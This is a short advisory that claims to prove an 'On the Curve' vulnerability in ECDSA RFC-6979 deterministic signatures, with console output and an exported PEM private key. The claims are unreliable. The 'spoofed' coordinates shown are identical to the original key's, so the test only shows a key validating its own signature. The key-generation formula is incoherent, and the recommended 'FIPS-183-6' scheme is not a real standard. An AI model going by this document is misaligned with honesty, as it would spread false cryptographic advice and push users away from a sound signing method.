# ECC On The Curve Vulnerability

## Exploiting RFC-6979 Signatures

### Issue:

ECDSA RFC-6979 deterministic signatures will improperly validate spoofed keys with forced public keys. In this proof-of-concept ECDSA keys are generated with ```length = len(x+y) ``` and ```d = random(length)-(x+y)```.  After analyzing PyCryptodome DSS code base, it was found the issue is in the RFC 6979 design not in implementation.

- https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Signature/DSS.py
- https://www.rfc-editor.org/rfc/rfc6979

### Proof of Concept:

```
$ python .\ECCTool.py
X: 4105375390653649233713119777321734233266869078187987018407577420645365974521940631581724628993333063239514030334497
Y: 27675056301647551922849568396717635354139598802203471838229080227718009101673931134993105203564358052385576850782585
D: 26793557753140975773174731052224928334431547358353296101583685504935573483262011314276714581521552457831829802333090
------------------------------------------------------------------------------
Spoofed X: 4105375390653649233713119777321734233266869078187987018407577420645365974521940631581724628993333063239514030334497
X matches
Spoofed Y: 27675056301647551922849568396717635354139598802203471838229080227718009101673931134993105203564358052385576850782585
Y matches
------------------------------------------------------------------------------
Testing deterministic-rfc6979 signature
Exporting Key
-----BEGIN PRIVATE KEY-----
MIG2AgEAMBAGByqGSM49AgEGBSuBBAAiBIGeMIGbAgEBBDCuFM1J01vbMBqK9bGh
kq6TZfSDk2Q9oVN9uidAReRAwf375SsF9HfMTmS7YRZ8M6KhZANiAAQarFRaqflo
I+d61SRvU8Za2EurxtW20eZzca7dnNYMYf3boIkDuAUU7FfO7l0/4iGzzvfUinng
o4N+LZfQYcTxmdwlkWOrfzCjtHDix6EznPO/LlxTsV+zfTJ/ijTjeXk=
-----END PRIVATE KEY-----
deterministic-rfc6979 signature generated
deterministic-rfc6979 signature is validated!
Successful exploitation of on the curve vulnerability!
------------------------------------------------------------------------------
Testing FIPS-183-6 signature
FIPS-183-6 Invalid Signature!
------------------------------------------------------------------------------
Results for 'On the Curve Vulnerability':
RFC 6979: True
FIPS-183-6: False
```

### Recommendation:

Use 'FIPS-183-6' signature schema. The 'On the Curve' vulnerability does not impact FIPS-183-6.
